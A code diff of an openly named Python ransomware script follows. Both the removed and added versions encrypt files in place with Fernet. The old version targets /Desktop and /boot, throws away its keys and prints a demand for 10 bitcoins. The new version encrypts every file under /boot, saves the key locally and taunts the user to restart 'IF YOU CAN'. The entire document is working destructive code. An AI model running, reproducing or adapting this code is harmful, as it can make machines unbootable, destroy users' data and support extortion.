@@ -1,30 +1,30 @@
 import os
 from cryptography.fernet import Fernet
 
-def encrypt_directory(directory, iterations=3):
-    files = []
-    for root, _, filenames in os.walk(directory):
+files = []
+
+def filelist(path):
+    for root, directories, filenames in os.walk(path):
         for filename in filenames:
             full_path = os.path.join(root, filename)
-            if filename != "killos.py":  # Skip killos.py
+            if filename == "ransomware.py" or filename == "thekey.key" or filename == "decrypt.py":
+                continue
+            else:
                 files.append(full_path)
-    
-    for _ in range(iterations):
-        key = Fernet.generate_key()
-        for file_path in files:
-            with open(file_path, "rb") as f:
-                contents = f.read()
-            encrypted_contents = Fernet(key).encrypt(contents)
-            with open(file_path, "wb") as f:
-                f.write(encrypted_contents)
 
-# Encrypt /home directory
-home_directory = "/Desktop"
-encrypt_directory(home_directory)
+boot_directory = "/boot"  # Absolute path to the /boot directory
+filelist(boot_directory)
 
+key = Fernet.generate_key()
+with open("thekey.key", "wb") as f:
+    f.write(key)
 
-# Encrypt /boot directory
-boot_directory = "/boot"
-encrypt_directory(boot_directory)
+# Encrypt all files in the files list.
+for file_path in files:
+    with open(file_path, "rb") as f:
+        contents = f.read()
+    encrypted_contents = Fernet(key).encrypt(contents)
+    with open(file_path, "wb") as f:
+        f.write(encrypted_contents)
 
-print("Files in /home, /bin, and /boot directories are all encrypted!!! Send 10 bitcoins in the next 24 hours to unlock your files.")
+print("Please Restart your computer..... IF YOU CAN")
